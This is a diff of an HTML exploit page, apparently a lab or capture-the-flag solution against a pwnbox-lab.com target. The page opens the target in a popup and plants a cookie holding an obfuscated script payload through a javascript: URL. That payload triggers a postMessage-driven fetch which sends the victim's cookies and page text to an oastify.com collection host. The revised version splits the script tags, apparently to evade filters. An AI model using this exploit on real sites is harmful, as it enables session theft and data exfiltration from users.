@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
   <meta charset="UTF-8">
   <title>Exploit</title>
@@ -8,37 +8,46 @@
   <h1>Loading...</h1>
 
   <script>
-    const TARGET_ORIGIN = "https://a28a7e0b9340.pwnbox-lab.com/";
-    const OAST_URL = "https://323l3f6diatmiai95n8e61s9q0wrkk89.oastify.com";
+    var TARGET_ORIGIN = "https://a28a7e0b9340.pwnbox-lab.com/";
+    var OAST_URL = "https://4inmjgmeyb9nybyaloofm28a61cs0mob.oastify.com";
 
-    fetch(OAST_URL + "/admin-landed").catch(() => {});
+    fetch(OAST_URL + "/admin-landed").catch(function () {});
 
-    const victimWindow = window.open(TARGET_ORIGIN + "/");
+    var victimWindow = window.open(TARGET_ORIGIN + "/");
 
-    setTimeout(() => {
+    setTimeout(function () {
       if (!victimWindow) {
-        fetch(OAST_URL + "/popup-blocked").catch(() => {});
+        fetch(OAST_URL + "/popup-blocked").catch(function () {});
         return;
       }
 
-      const xssPayload =
-        "<script>" +
-        "window.postMessage(" +
-        JSON.stringify(
-          "fetch('" + OAST_URL + "/?c='+encodeURIComponent(document.cookie)+'&b='+encodeURIComponent(document.body.innerText))"
-        ) +
-        ", '*')" +
-        "<\/script>";
+      var evalCode = "";
+      evalCode += "fetch(";
+      evalCode += JSON.stringify(OAST_URL + "/leak?d=");
+      evalCode += "+encodeURIComponent(document.cookie)";
+      evalCode += "+";
+      evalCode += JSON.stringify("&body=");
+      evalCode += "+encodeURIComponent(document.body.innerText)";
+      evalCode += ")";
 
-      const cookieString = "a=" + xssPayload + "; path=/; max-age=3600";
+      var cookiePayload = "";
+      cookiePayload += "<scr" + "ipt>";
+      cookiePayload += "window.postMessage(";
+      cookiePayload += JSON.stringify(evalCode);
+      cookiePayload += ",";
+      cookiePayload += JSON.stringify(TARGET_ORIGIN);
+      cookiePayload += ")";
+      cookiePayload += "</scr" + "ipt>";
 
-      const jsCode =
-        "document.cookie=" + JSON.stringify(cookieString) + ";" +
-        "location.href=" + JSON.stringify(TARGET_ORIGIN + "/") + ";";
+      var cookieValue = "a=" + cookiePayload + "; path=/; max-age=3600";
 
-      victimWindow.location.href = "javascript:" + jsCode;
+      var jsUrlCode = "";
+      jsUrlCode += "document.cookie=" + JSON.stringify(cookieValue) + ";";
+      jsUrlCode += "location.href=" + JSON.stringify(TARGET_ORIGIN + "/") + ";";
 
-      fetch(OAST_URL + "/payload-sent").catch(() => {});
+      victimWindow.location.href = "javascript:" + jsUrlCode;
+
+      fetch(OAST_URL + "/payload-sent").catch(function () {});
     }, 2000);
   </script>
 </body>
